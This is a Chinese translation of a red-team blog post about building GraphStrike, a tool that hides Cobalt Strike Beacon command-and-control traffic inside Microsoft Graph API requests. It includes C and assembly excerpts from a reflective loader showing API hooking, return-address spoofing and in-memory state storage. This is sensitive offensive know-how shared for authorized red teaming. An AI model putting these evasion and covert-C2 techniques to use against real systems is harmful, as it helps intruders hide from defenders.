

# GraphStrike：进攻性工具开发剖析 - 先知社区

GraphStrike：进攻性工具开发剖析

- - -

原文链接：[https://redsiege.com/blog/2024/01/graphstrike-developer/](https://redsiege.com/blog/2024/01/graphstrike-developer/)

# 介绍

这篇博文伴随着名为 GraphStrike 的开源工具的发布，您[可以在此处](https://github.com/RedSiege/GraphStrike)找到该工具。

熟悉我之前工作的人会知道，当我发布项目及其文档时，我不会忽略细节。我这样做是希望在从许多伟大的贡献者那里受益匪浅之后，能够对进攻性网络社区进行“再投资”。为此，我想让新的或有抱负的进攻型开发人员了解一下我的最新公共工具 GraphStrike 的设计理论和开发过程，也许会对他们有所帮助。这是我写过的最长的博文，进入这里的人请放弃所有希望。

# 一切始于一个想法

我的大部分项目都源于我看到的一条推文或我的一个随机想法。故事要从一年半前说起，当时我偶然发现了 Bobby Cooke 的 Azure Outlook C2 项目，该项目通过编辑 Microsoft Outlook 电子邮件草稿来使用 Microsoft Graph API 作为 C2。Graph API 提供了访问和操作 Microsoft 生态系统内数据的方法，并通过向 graph.microsoft.com 发送请求来使用。这包括 Microsoft Teams 消息、SharePoint 和 OneDrive 文件、Outlook 电子邮件以及有关用户、组和应用程序的 Azure 数据等。另外，作为一名 Cobalt Strike 的重度用户，我认为如果我能够将这两个概念结合起来并找到一种将 Graph API 与 Cobalt Strike Beacons 结合使用的方法，那就太酷了。

# 但这值得追求吗？

此时需要提出几个重要问题：  
第一个是，“虽然在 Graph API 上使用 Beacon 会非常酷，但此功能是否可以：

​ A.与其他不太复杂的方法相比，具有明显的工艺优势，或者

​ B. 是威胁行为者的独特代表吗？”

第二个问题是，“是否已经存在一种工具可以实现我所提议的功能，如果是的话，我的工具会带来一些有意义的不同东西吗？”

从第一个问题开始，这是否是一种明显的技术改进，和/或是否是威胁行为者的独特代表？

当我第一次深入研究这个概念时，仅凭它所提供的技术优势，我就批准了它。能够将 C2 流量路由到 microsoft.com 域名，在网络出口过滤和检测方面具有巨大优势。鉴于在此期间发布的威胁情报，该项目实际上两全其美。已观察到多个不同的恶意软件家族使用 Graph API 作为 C2，这些 APT 恶意软件家族被命名为：

1.  [BLUELIGHT – APT37/InkySquid/ScarCruft](https://www.volexity.com/blog/2021/08/17/north-korean-apt-inkysquid-infects-victims-using-browser-exploits/)
2.  [Graphite – APT28/Fancy Bear](https://malpedia.caad.fkie.fraunhofer.de/details/win.graphite)
3.  [Graphican – APT15/Nickel/The Flea](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/flea-backdoor-microsoft-graph-apt15)
4.  [SiestaGraph – UNKNOWN](https://www.elastic.co/security-labs/siestagraph-new-implant-uncovered-in-asean-member-foreign-ministry)

作为红队队员，我们的工作就是在行动中提供具有代表性的威胁效果，而且需要非常关注这一点。当然，它们被称为 "高级持续性威胁 "是有原因的；这些组织使用的许多工具和技术（但不是全部，2023 年的实际入侵事件中仍有大量 "whoami.exe"）都是专有的，其检测能力远不如 Cobalt Strike 或其他任何现成的 C2 那样可用或成熟。这使得红队很难复制这些技术，也使防御者失去了观察和开发此类活动特征的机会。任何能让有授权的红队人员更容易获得先进技术的工具都是巨大的成功。

转向第二个问题，是否已经存在一个工具可以实现我所提议的功能，如果是的话，我的工具会带来一些有意义的不同东西吗？”

虽然将现有工具移植到不同的语言或格式肯定是有价值的，但真正让我兴奋的项目是那些我将创造出明显新的或独特的东西的项目。

一年半前，我有点管中窥豹。我专注于将 Microsoft Teams 作为我想用于 C2 流量的媒介，但忽略了底层的 Graph API 部分。我找不到任何使用 Teams 进行 Cobalt Strike C2 的公共项目，但在考虑整个 Graph API 时，WithSecure 长期以来就有他们的 C3 项目，其中包括使用 OneDrive 文件进行 Cobalt Strike C2 的选项。归根结底，无论是 Teams 消息还是 OneDrive 文件，都是通过 Graph API 完成的。话虽如此，仅仅因为某件事以前已经做过并不意味着舞台上没有其他提供有意义改进的工具的空间。

最终，我对这个概念的第一次尝试采用了符合规范的 Cobalt Strike 外部 C2 的形式，它使用 Graph API 通过 Teams 消息发送 Beacon 流量。我从未公开发布过它，但确实在一次会议上介绍过它。这是一个有趣的项目，但也被证明设计和维护非常复杂，因为它涉及用位置无关的 C 语言编写自定义植入程序，以在 Cobalt Strike SMB Beacon 和 Graph API 之间进行通信。

这给我们带来了一些不能被夸大的事情，也是我后来重新审视这个想法的主要原因之一：**对于攻击性工具，技术上“有效”的东西与可靠、可重复且易于部署的东西之间存在很大差异。**我之前的项目是前者；GraphStrike 力求成为后者，尽可能减轻围绕此类功能的设置和部署的头痛和挑战。

从架构的角度来看，我第一次尝试这个概念与第二次尝试之间的有意义的区别在于，不再遵循外部 C2 规范（使用自定义植入物、SMB Beacon，并且进入门槛相对较高）。GraphStrike 提供了通过 HTTPS Beacons 使用 Graph API 的能力。这种设计消除了需要开发、维护和与目标上的 SMB Beacon 一起部署完整的单独植入物的要求。

# 初步研究

在这一点上，我们应该花点时间更好地理解 Graph API 以及我们将如何尝试使用它。使用 Graph API 需要拥有 Microsoft Azure 租户，并在其中注册一个新的 Azure 应用程序。Azure 应用程序可以分配许多不同的 API 权限，这些权限需要以不同的组合方式分配，以便使用 Graph API 中的各种方法。例如，根据 "权限类型"，获取 driveItem 方法需要以下权限

| **权限类型** | **最低特权权限** | **更高的特权权限** |
| --- | --- | --- |
| 委托（工作或学校帐户） | Files.Read | Files.ReadWrite, Files.Read.All, Files.ReadWrite.All, Group.Read.All, Group.ReadWrite.All, Sites.Read.All, Sites.ReadWrite.All |
| 委托（个人 Microsoft 帐户） | Files.Read | Files.ReadWrite, Files.Read.All, Files.ReadWrite.All |
| 应用  | Files.Read.All | Files.ReadWrite.All, Group.Read.All, Group.ReadWrite.All, Sites.Read.All, Sites.ReadWrite.All |

委派权限用于用户能够登录应用程序并使用其分配的权限代表用户发出请求的工作流。对于这个项目，我们可以保持简单，只使用“应用程序”权限，其中应用程序本身是执行所有相关操作的“用户”。为此，如果我们想在 Graph 中使用“getdriveItem”方法，我们需要创建一个应用程序并至少为其分配“Files.Read.All”权限。

创建应用程序后，必须为其分配客户端密钥。实际上，这是应用程序的密码，并将用于获取访问令牌，以便使用任何 Graph API 方法。这些访问令牌的生命周期为 1 小时，之后必须重新使用客户端密钥才能获取新的有效访问令牌。

使用 Graph API 的 C2 通信模型可能是什么样子，也值得探讨。在 C2 中使用任何第三方服务（Graph API 或其他）都会增加复杂性。请参考下面两张图片，它们的质量与我在 Paint 3D 中花费的时间完全不符：

[![](assets/1709614992-04673756f6b5d035131eb82aaf59d426.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240302221109-b78bdf48-d89e-1.png)

[![](assets/1709614992-dd1cd0a9465b16f6e6245ead7f4415bc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240302221112-b9a27558-d89e-1.png)

上图显示了正常的 Cobalt Strike（以及大多数其他 C2）HTTPS 流量的通信方式。Beacon 调用 Cobalt Strike 侦听器中指定的 IP 或域，然后侦听器将 GET 和 POST 请求路由回 Cobalt Strike Team 服务器 (TS)。你正在使用重定向器并且没有公开托管您的 TS，对吗？TS 响应请求，然后通过重定向器将请求路由回 Beacon。十分简单。

GraphStrike 通信模型更为复杂。Beacon 流量不再一路到达 TS，而是停止在 Microsoft 服务器上。从 Beacon 的角度来看，Graph API 服务器响应是 TS 回复 Beacon 的 http-get 和 http-post 请求。同样，在 TS 方面，我们现在需要联系 Microsoft 服务器，以便上传新的 TS 任务并获取 Beacon 输出。此要求由 Python3 服务器（以下称为 GraphStrike 服务器）满足。该服务器向 Microsoft 服务器和 TS 发出 HTTPS GET 和 POST 请求，充当根据需要操作和转换 Cobalt Strike 数据的桥梁，以提供与 Graph API 的功能和兼容性。

遗憾的是，通常需要一个 HTTPS 事务现在需要三个，并且作为一种有趣的后续效果，我们现在正在处理异步连接；当 TS 发出命令时，必须首先将其上传到 Microsoft 服务器，然后 Beacon 在将来的某个时刻才能找到该命令。同样，当 Beacon 发出 http-post 将任务输出发送到 TS 时，它会被上传到 Microsoft 服务器，稍后必须由 GraphStrike 服务器检索。从 TS 检索任务到 Beacon 实际执行任务之间有额外延迟，不幸的是，这是通过第三方服务的异步 C2 所固有的特性。

# 评估阻断器并确定可行性

一个想法值得去追求，但并不意味着它一定能走向成熟。我曾不止一次地为一个想法投入了几十个小时，但后来却遇到了一个终止项目的障碍。因此，在花费大量时间进行实际编程之前，我都会尝试绘制出项目的关键细节，并确保我能设想出一个可行的解决方案。这就需要我花大量的时间搜索谷歌和阅读文档来拼凑项目。我非常喜欢用白板（或者在紧要关头用 MS Paint）来可视化项目及其所有移动部件，不止一次有人在看到我的白板后给我发了这个表情包：

[![](assets/1709614992-d9df21fed5d46536a184714f5e2dd227.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240302221129-c3f8e9c4-d89e-1.png)

通过第三方服务了解了有关 Graph API 和 C2 的更多信息后，我确定了在项目被认为可行之前需要解决的几个关键障碍：

1.  Graph API 要求所有请求都使用访问令牌，并且该令牌每小时过期。Cobalt Strike Beacons 不支持在运行时更改其请求标头。
2.  获取新的访问令牌需要向不同的域（login.microsoft.com 而不是 graph.microsoft.com）发出 Web 请求。虽然 Cobalt Strike 确实支持指定侦听器使用的多个域（在 4.9 中甚至支持每个域的流量自定义），但它不提供“存储”请求检索的值以供以后使用的功能。
3.  必须识别与 Beacon http-get 和 http-post 循环兼容的，某些 Graph API 调用组合。Beacon 通常连接到 TS 以检索任务并发送输出；现在它需要从一些可通过 Graph API 访问的 Microsoft 数据存储机制中检索任务，并通过类似的方法上传输出。

最重要的是，如果我无法找到解决每个问题的方法，那么该项目在真正开始之前就已经死了。

# 轮换访问令牌

要解决的第一个决定成败的挑战涉及使用 Graph API 所需的 Microsoft 访问令牌。如前所述，这些令牌每小时过期一次，此时必须通过连接 login.microsoft.com 获取新的令牌。

在考虑如何解决这个问题时，我首先考虑创建一个 Aggressor 脚本集成，该集成将获取访问令牌，然后在通过 Cobalt Strike 客户端生成一个 Beacon 时将其修补到 Beacon 中。这将至少提供 Beacon 与 Graph API 通信所需的初始访问令牌。为了检索所有后续访问令牌，我设想使用 BOF 来定位 Beacon 进程内存中的初始访问令牌，并用 TS 定期发送的新访问令牌替换它。

这种方法存在几个问题。首先，也是最重要的，在生成 Beacon 时检索初始访问令牌并将其修补到 Beacon 中，并设置一个计时器来确定 Beacon 的可用时间；想象这样一个场景：您托管有效负载并发送网络钓鱼电子邮件，但受害者在 6 小时后才下载并执行您的 Beacon。鉴于令牌在一小时后过期，Beacon 将无法使用 Graph API。忽略这个问题，尝试在 Beacon 内存中找到旧的访问令牌并修补长度可能不同的新访问令牌，我认为这并不是一个特别有吸引力或可行的想法。

# 对多个域的请求

随着时间的推移，更新 Beacon 的请求标头以包含新的访问令牌是难题之一，但实际检索新的访问令牌则完全是另一回事。考虑到上面讨论的问题，让 Beacon 本身获取访问令牌似乎确实是明智的选择。这将涉及 Beacon 向 login.microsoft.com 发出 HTTPS 请求以检索新的访问令牌，以及向 graph.microsoft.com 发出 HTTPS 请求以进行实际的 C2 通信。

正如前面简要提到的，Cobalt Strike 确实支持侦听器的多个主机；更重要的是，它现在还支持多个 HTTP 主机配置文件，或可延展配置文件中的每个主机名请求自定义。使用这些功能，我可以为 login.microsoft.com 和 graph.microsoft.com 定义单独的主机配置文件，这将满足根据 Beacon 调用的主机使用不同标头、参数和 URI 的要求。

这听起来很有希望，但更仔细的审查会发现更多问题。例如，Cobalt Strike 侦听器仅支持基本的主机轮换策略。没有任何机制可以指示 Beacon 在某些情况下调用 login.microsoft.com，在其他情况下调用 graph.microsoft.com。此外，即使有，Beacon 也不支持存储服务器返回的值以供以后使用，并且它会尝试解析包含新访问令牌的响应，就好像它是来自 TS 的消息一样。似乎没有任何直接的方法来解决这个问题。

# 识别兼容的 Graph API 方法

有数百种不同的 Graph API 方法，从创建新日历事件的方法到用于检索安全日志的方法。在评估哪些方法可能适合 C2 目的时，重要的是要考虑在各种情况下可能传输的数据量。Cobalt Strike 中发出的大多数命令都相对较小，当 Beacon 检查任务分配时，“ps”或“ls”等命令会向 Beacon 发送大约 48 个字节的内容。其他场景（例如尝试通过 Beacon 运行工具）可能会涉及在单次签入期间传输数 MB 的数据，因此我们选择的任何 Graph API 方法都必须支持整个使用场景，这一点至关重要。

例如，在 Graph API 的“个人联系人”部分中有一个创建新联系人的方法；为了确定使用联系人进行数据传输的可行性，我们需要查看联系人结构中包含哪些值。有用的是，Graph API 文档包含每种方法的用法示例，我们可以从中了解给定对象中存储的数据类型：

```plain
POST https://graph.microsoft.com/v1.0/me/contacts
Content-type: application/json

{
  "givenName": "Pavel",
  "surname": "Bansky",
  "emailAddresses": [
    {
      "address": "pavelb@fabrikam.onmicrosoft.com",
      "name": "Pavel Bansky"
    }
  ],
  "businessPhones": [
    "+1 732 555 0102"
  ]
}
```

在这种情况下，字段似乎相当有限。它们看起来都不适合存储大量数据。

值得仔细研究一下本文开头列出的 Graph API 恶意软件的现实示例。有趣的是，他们中的大多数都使用一组通用的 Graph API 方法：与 OneDrive 和 SharePoint 文件管理相关的方法。毫不奇怪，最相关的是上传和下载方法。Upload 方法描述如下：

> 在单个 API 调用中提供新文件的内容或更新现有文件的内容。此方法仅支持最大 250 MB 的文件。

这听起来肯定会满足我们的需求。Beacon 以 512KB 块的形式发送大量输出，因此即使我们想要下载 5GB 的文件，它也会以远低于 Upload 方法的每个请求 250MB 限制的方式完成。看一下这个例子，我们发现了一种非常简单的方法，但有一个明显的问题：

```plain
PUT /me/drive/root:/FolderA/FileB.txt:/content
Content-Type: text/plain

The contents of the file goes here.
```

Upload 方法使用 HTTP PUT 动词。虽然 Cobalt Strike 配置文件允许用户自定义在 http-get 和 http-post 事务中使用的动词（因此，如果用户想要“仅 get”配置文件，则可以自定义），但实际支持的唯一方法是“GET”和“POST”。运行 Cobalt Strike 配置文件 linter c2lint 证明了这一点。

[![](assets/1709614992-646b245bb5bf4526528f148fa8bce9de.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240302221145-ccfb8e82-d89e-1.png)

即使 Cobalt Strike 支持 PUT 方法，也很难想象一种能够同时支持多个 Beacon 的可行解决方案。Beacon 调用的 URI 在配置文件中设置，这意味着生成的每个 Beacon 将尝试调用同一位置。通常，TS 能够通过查看使用 http-gets 发送的元数据和使用 Beacon http-posts 发送的会话 ID 来区分一个 Beacon。

通过引入实际的硬“停止”，其中 Beacon 数据（任务或输出）在被另一方拾取之前处于静止状态，该 Beacon 识别信息将丢失并且必须以其他方式进行通信。为了解决这个问题，需要采取一些方法来操作 Beacon 的 URI，以确保每个 Beacon 在第三方服务中都有自己的“存储”，从而 GraphStrike 可以提供多 Beacon 支持。

总而言之，我们现在有一大堆理由说明为什么这个想法可能不可行。基础 CobaltStrike 产品不够灵活，无法支持与正常 HTTPS C2 方法的所有偏差。这并不意味着梦想已经破灭，只是我们需要走得更深。

# 开源工具来拯救

综合来看这些拦截器，我发现的共同需求是，我需要一些在运行时操纵 Beacon 行为的方法。这让我最终看到了 Cobalt Strike 用户定义的反射加载器 (UDRL)。UDRL 为操作员提供了修改 Beacon 实际加载到内存的方式的机会。至关重要的是，它使操作员能够在第一次实际执行/调用 Beacon 之前的流程中执行其他代码。有几种不同的 UDRL 可供公开使用，但在项目的自述文件中注意到这一点后，我将重点放在了 Kyle Avery 的 AceLdr 上：

> 某些 WinAPI 调用是使用欺骗性的返回地址（InternetConnectA、NtWaitForSingleObject、RtlAllocateHeap）执行的。

查看代码，我发现提到的每个 API 都有自定义函数：

```plain
SECTION( D ) HINTERNET InternetConnectA_Hook( HINTERNET hInternet, 
                                               LPCSTR lpszServerName, 
                                               INTERNET_PORT nServerPort, 
                                               LPCSTR lpszUserName, 
                                               LPCSTR lpszPassword, 
                                               DWORD dwService, 
                                               DWORD dwFlags, 
                                               DWORD_PTR dwContext )
{
    API     Api;
    PPEB    Peb;
    HANDLE  hNet;
    ULONG   Size;

    RtlSecureZeroMemory( &Api, sizeof( Api ) );

    Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    hNet = FindModule( H_LIB_WININET, Peb, &Size );

    Api.net.InternetConnectA = FindFunction( hNet, H_API_INTERNETCONNECTA );

    return ( HINTERNET )SPOOF( Api.net.InternetConnectA, 
                                hNet, 
                                Size, 
                                hInternet, 
                                C_PTR( lpszServerName ), 
                                C_PTR( U_PTR( nServerPort ) ), 
                                C_PTR( lpszUserName ), 
                                C_PTR( lpszPassword ), 
                                C_PTR( U_PTR ( dwService ) ), 
                                C_PTR( U_PTR( dwFlags ) ), 
                                C_PTR( U_PTR( dwContext ) ) );
};
```

值得注意的是，上面定义的 InternetConnectA\_Hook 函数采用与真实 Windows API InternetConnectA 完全相同的参数。

AceLdr 执行导入地址表 (IAT) 挂钩，其中某些 API（如 InternetConnectA）内存地址在 Beacon 进程导入地址表 (IAT) 内被覆盖，并替换为相应自定义函数的地址。IAT 可以比作书籍中的目录或索引，其中不同的章节列在它们开始的页面旁边。通过 IAT 挂钩，我们可以有效地更改与章节 (API) 关联的页码（内存地址）。结果是，当调用挂钩的 API 之一时，IAT 返回 AceLdr 等效的用户定义函数的地址，而不是 Microsoft DLL 中的真实函数的地址，并执行该自定义函数。对于 AceLdr 挂钩的大多数 API，所有自定义函数所做的就是使用 SPOOF 宏调用真正的 API（手动解析而不是使用 IAT），以实现返回地址欺骗。

返回地址欺骗虽然很酷并且在逃避方面本身非常有价值，但与手头的任务并不真正相关。非常相关的是能够拦截 API 调用、运行一些用户定义的代码，然后将执行修补回进程调用的真实 API。这使我们能够在调用真正的 API 之前拦截和更改 Beacon 发送的参数，并打开大门：

1.  在 Beacon 的正常通信周期之外发出 Web 请求以获取新的访问令牌
2.  在内存中存储和轮换访问令牌
3.  修改 Beacon 为请求提供的标头以包含当前访问令牌
4.  将 Beacon 使用的动词更改为 PUT，以便它可以支持使用 Graph API 文件方法

重要的是，AceLdr 提供了一个工作框架，我可以从中进行定制，以满足 GraphStrike 确定的要求。

# 关于 AceLdr 和 UDRL 的一些注释

AceLdr 的发现使这一想法超越了已识别的阻碍因素，进入了可行性领域。我们已经确定了一种在 Beacon 执行之前（通过 UDRL）以及在整个 Beacon 生命周期（通过 UDRL 设置的挂钩函数）运行任意代码的方法，但在我们深入研究如何利用这些功能的细节之前对于 GraphStrike，我们应该仔细研究 AceLdr 的一些相关部分以及它们如何影响该项目。Cobalt Strike 团队发布了一篇很棒的博客，其中涵盖了 UDRL 背后的一些基本理论和设计，我强烈鼓励读者查看。

UDRL 开发带来的有趣的额外负担之一是代码必须编写为位置无关的；这限制了 Windows 和 C API 的正常使用以及全局变量和标准字符串的使用。AceLdr 使用一个巧妙的技巧和一些宏来启用正常的字符串使用，但我们仍然必须为我们想要在代码中使用的任何 API 手动创建函数指针。AceLdr 使用名为“resolveAceFunctions”的函数来完成此操作，如下所示：

```plain
SECTION( B ) NTSTATUS resolveAceFunctions( PAPI pApi )
{
    PPEB    Peb;
    HANDLE  hNtdll;

    Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    hNtdll = FindModule( H_LIB_NTDLL, Peb, NULL );

    if( !hNtdll )
    {
        return -1;
    };

    pApi->ntdll.NtGetContextThread  = FindFunction( hNtdll, H_API_NTGETCONTEXTTHREAD );
    pApi->ntdll.NtSetContextThread  = FindFunction( hNtdll, H_API_NTSETCONTEXTTHREAD );
    pApi->ntdll.NtResumeThread      = FindFunction( hNtdll, H_API_NTRESUMETHREAD );
    pApi->ntdll.RtlUserThreadStart  = FindFunction( hNtdll, H_API_RTLUSERTHREADSTART );
    pApi->ntdll.RtlCreateUserThread = FindFunction( hNtdll, H_API_RTLCREATEUSERTHREAD );

    if( !pApi->ntdll.NtGetContextThread ||
        !pApi->ntdll.NtSetContextThread ||
        !pApi->ntdll.NtResumeThread     ||
        !pApi->ntdll.RtlUserThreadStart ||
        !pApi->ntdll.RtlCreateUserThread )
    {
        return -1;
    };

    return STATUS_SUCCESS;
};
```

这里，AceLdr 使用一些辅助函数，如“FindModule”和“FindFunction”来解析 NTDLL 中几个不同 API 的内存地址。这些地址与 PAPI 结构中的类型定义（作为参数传递到 resolveAceFunctions 中）相结合，以便创建稍后可以使用的函数指针。这可以在“createBeaconThread”函数中看到，该函数使用“RtlCreateUserThread”函数指针：

```plain
SECTION( B ) NTSTATUS createBeaconThread( PAPI pApi, PHANDLE thread )
{
    BOOL Suspended = TRUE;
    PVOID StartAddress = C_PTR( pApi->ntdll.RtlUserThreadStart + 0x21 );

    return pApi->ntdll.RtlCreateUserThread( ( HANDLE )-1, NULL, Suspended, 0, 0, 0, ( PUSER_THREAD_START_ROUTINE )StartAddress, NULL, thread, NULL );
};
```

这种解析 API 的方法用于 AceLdr 的每个自定义函数（如前面所示的 InternetConnectA\_Hook）。

# 技术设计

了解了有关 AceLdr 和 UDRL 的一些基础知识后，是时候弄清楚如何在 GraphStrike 中实现这项工作了。请注意，在本文的其余部分中，GraphStrike 的 UDRL 部分将称为 GraphLdr；AceLdr 仍然是底层的核心和灵魂，但它将经历足够重大的转变，以保证其自己独特的名称。  
下面细分了与 GraphStrike 技术设计细节相关的几个小节。我试图按照某种“顺序”进行创作，但要明白，这些作品中的许多部分本质上是相互联系在一起并相互影响的，因此很难以真正的线性方式进行写作。另请注意，包含的任何代码片段都代表最终产品中找到的“工作”代码；也就是说，这个项目的早期版本远不如您在这里看到的那样精致或高效。

# 替换全局变量

在深入研究技术杂草之前，需要完成一些基础工作。为了控制 GraphStrike 组件的行为，必须在 Beacon 的整个生命周期中跟踪许多值。这些变量由不同源文件中的各种函数使用，因此全局变量确实是完成这项工作的正确工具。只是简单地提到了这一点，但编写与位置无关的代码在这方面施加了限制。这与存储全局变量的 Windows 可移植可执行文件 (PE) 中的特定部分有关，该部分不包含在最终的 GraphLdr UDRL 中。

提到的另一个问题是 GraphLdr 中想要使用 Windows 或 C API 的任何函数都必须首先手动解析它们。这包括自定义 API 挂钩函数。需要考虑的是这些函数被调用的频率；例如，Beacon 每次发出新的 http-get 或 http-post 请求时都会调用 InternetConnectA\_Hook，因此，如果 Beacon 的睡眠时间设置为 1 秒，则挂钩函数每分钟至少被调用 60 次。每次，InternetConnectA\_Hook 都必须调用前面提到的辅助函数来解析它所需的 API，这看起来效率极低。

这两个问题的解决方案在于一种技术，该技术目前已进入我的几个工具中：在包含所需变量的堆上创建一个自定义结构，然后存储该结构的内存地址以供以后使用各种功能的检索和使用。在这个结构体中，我们可以存储我们将在整个 GraphLdr 中使用的每个 Windows 或 C API 的函数指针，以及用于控制 GraphStrike 行为的附加单个变量。该结构体如下所示：

```plain
struct MemAddrs {
    struct {
        struct
        {
            D_API( RtlAllocateHeap );
            D_API( NtWaitForSingleObject );
            HANDLE hNtdll;
            ULONG size;
        } ntdll;

        struct
        {
            D_API( InternetConnectA );
            D_API( HttpOpenRequestA );
            D_API( HttpSendRequestA );
            D_API( InternetReadFile );
            D_API( InternetCloseHandle );
            HANDLE hNet;
            ULONG size;
        } net;

        struct
        {
            D_API( GetLastError );
            D_API( SetLastError );
            D_API( QueryPerformanceCounter );
            D_API( QueryPerformanceFrequency );
            D_API( Sleep );
        } k32;

        struct
        {
            D_API ( strlen );
            D_API ( strstr );
            D_API ( strcpy );
            D_API ( strcmp );
            D_API ( isdigit );            
            D_API ( sprintf );
            D_API ( memset );
            D_API ( malloc );
            D_API ( calloc );
            D_API ( memcpy );
            D_API ( free );
            D_API ( tolower );
        } msvcrt;

        struct
        {
            D_API( MessageBoxA );
        } user32;
    } Api, *pApi;

    BOOL            graphStrike;
    HINTERNET       hInternet;
    BOOL            firstGet;
    BOOL            firstPost;
    BOOL            activeGet;
    BOOL            readTasking;
    LONGLONG        lastTokenTime;
    char*           metaData;
    PVOID           httpGetUri;
    PVOID           httpPostUri;
    PVOID           httpPostCheckSizeUrl;
    PVOID           httpGetHeaders;
    PVOID           httpPostHeaders;
    PVOID           httpGetHeadersLen;
    PVOID           httpPostHeadersLen;             
};
```

存储这个关键结构的内存地址是有趣的地方。在过去的项目中，我在 Beacon 和 TS 之间来回传递该结构的地址，使用 Cobalt Strike 的 Aggressor 语言来存储该地址，然后在需要时使用 BOF 将地址发送回 Beacon。这种策略在这种情况下不可行（一开始也不是特别优雅），因为 Beacon 需要在其整个生命周期中轻松访问该地址。过去的一位同事向我展示了如何使用 Windows Atom Tables 来存储然后按需检索地址，但在这种情况下，这种技术仍然有一些不足之处，因为与 Atoms 交互的 API 每次仍然需要手动解析。

最终纳入 GraphLdr 的技术对我来说是一项新技术，也是我通过查看 AceLdr 的各种源文件并将一些片段组合在一起才发现的技术。我注意到在其中一个 .asm 文件中定义了一组汇编指令 `Stub` 。它还被声明为 `GLOBAL` 以便可以从外部访问：

```plain
[BITS 64]

GLOBAL GetIp
GLOBAL Stub

[SECTION .text$C]

Stub:
    dq 0
    dq 0
    dq 0

... Trimmed for Brevity ...
```

然后在项目的主头文件（“include.h”）中，定义了一个结构体 `STUB, *PSTUB` ，并为 `Stub` 变量进行了 extern 声明。在这种情况下，大小写很重要；extern 声明引用 asm 的 `Stub` 部分，而不是 `STUB, *PSTUB` 结构：

```plain
... Trimmed for Brevity ...

typedef struct __attribute__(( packed ))
{
    ULONG_PTR Region;
    ULONG_PTR Size;
    HANDLE Heap;
} STUB, *PSTUB ;

... Trimmed for Brevity ...

extern ULONG_PTR Stub( VOID );

... Trimmed for Brevity ...
```

在主源文件（‘ace.c’）中， `Stub` 变量被转换为 `PSTUB` 类型并填充一些数据：

```plain
SECTION( B ) VOID fillStub( PVOID buffer, HANDLE heap, SIZE_T region )
{
    PSTUB Stub = ( PSTUB )buffer;

    Stub->Region = U_PTR( buffer );
    Stub->Size = U_PTR( region );
    Stub->Heap = heap;
};
```

随后在一个完全独立的源文件（‘delay.c’）中，使用 OFFSET 宏访问 `Stub` 变量，并且其成员用于填充本地结构：

```plain
SECTION( D ) VOID Sleep_Hook( DWORD dwMilliseconds )
{
    API Api;
    RtlSecureZeroMemory( &Api, sizeof( Api ) );

    Api.CFG = 0;
    Api.dwMilliseconds = dwMilliseconds;
    Api.Buffer = C_PTR( ( ( PSTUB ) OFFSET( Stub ) )->Region );
    Api.Length = U_PTR( ( ( PSTUB ) OFFSET( Stub ) )->Size );

    ... Trimmed for Brevity ...
};
```

综合来看，这看起来非常像 AceLdr 通过在 asm 文件中保留内存来创建“全局”变量，然后填充它并在整个代码中引用它。尽管我对编译器和二进制级别上到底发生了什么没有很好的理解，但我有足够的模式识别技能来为我自己的目的重新创建这项技术。

我在 asm 文件中创建了一个附加条目 `MemAddr` 并将其声明为全局：

```plain
[BITS 64]

GLOBAL GetIp
GLOBAL Stub
GLOBAL MemAddr

[SECTION .text$C]

Stub:
    dq 0
    dq 0
    dq 0

MemAddr:
    dq 0

... Trimmed for Brevity ...
```

然后我在头文件中创建了一个新结构 `MEMADDR, *PMEMADDR` 并将 `MemAddr` 声明为 extern：

```plain
typedef struct __attribute__(( packed )) {
    PVOID* address;
} MEMADDR, *PMEMADDR;

extern ULONG_PTR MemAddr( VOID );
```

然后，在“gs.c”内的 GraphLdr 入口点中，我为 MemAddrs 结构（前面显示的包含所有函数指针和变量的大结构）分配了内存作为 `pMemAddrs` 并分配了一些变量。调用“resolveGraphStrikeFunctions”方法来填充 `pMemAddrs` 内的函数指针，以便可以使用所需的 Windows 和 C API 调用，最后将指向 `pMemAddrs` 的指针分配给 < b3> 驻留在 asm 中的变量：

```plain
... Trimmed for Brevity ...

        // Create MemAddr struct to contain important values for GraphStrike
        struct MemAddrs *pMemAddrs  = Api.msvcrt.malloc(sizeof(struct MemAddrs));
        Api.msvcrt.memset(pMemAddrs, 0, sizeof(struct MemAddrs));
        pMemAddrs->graphStrike = (BOOL) U_PTR ( NULL );
        pMemAddrs->firstGet = TRUE;
        pMemAddrs->firstPost = TRUE;
        pMemAddrs->readTasking = FALSE;        
        pMemAddrs->lastTokenTime = 0;

        // Resolve GraphStrike functions for later use
        resolveGraphStrikeFunctions(&Api, pMemAddrs);

        // Store pointer to pMemAddrs for later reference
        ((PMEMADDR)MemAddr)->address = (PVOID*)&pMemAddrs;  

        ... Trimmed for Brevity ...
```

稍后，在我想要使用 `pMemAddrs` 中的值的任何函数中，我只需取消引用存储在 `MemAddr` 中的指针，如第 4 行所示：

```plain
SECTION( D ) HINTERNET InternetConnectA_Hook( HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext )
{
    // Resolve API's
    struct MemAddrs* pMemAddrs = *(struct MemAddrs**)((PMEMADDR) OFFSET ( MemAddr ) )->address;

    // Only do this the first time through this function to check if this is actually a GraphStrike Beacon as opposed to a regular Beacon created with GraphStrike loaded
    if (pMemAddrs->graphStrike == (BOOL) U_PTR( NULL ))
    {
        // Convert lpszServerName to lowercase just in case
        char* serverCopy = (char *)pMemAddrs->Api.msvcrt.calloc(pMemAddrs->Api.msvcrt.strlen(lpszServerName) + 1, sizeof(char));

    ... Trimmed for Brevity ...
}
```

这个最终的演变在 GraphStrike 的开发中来得很晚（在我正在写博客文章时），但它提供了一个非常好用且方便的解决方案，我预计将来也会在其他项目中使用它。

# 识别 Beacon 通信 API

有了挂钩 API 和在不同函数间携带变量的能力之后，下一项任务就是弄清楚我们首先需要挂钩哪些 API。在最近发布的 Cobalt Strike 4.9 版中，Beacon 的选项中增加了对 WinHTTP 库的支持。Beacon 传统上一直使用 WinINet 库（它仍然是默认库）来处理网络请求，因此我决定将该库作为 GraphStrike 支持的目标。扩展对 WinHTTP 库的支持也是完全可能的，但这是后话了。

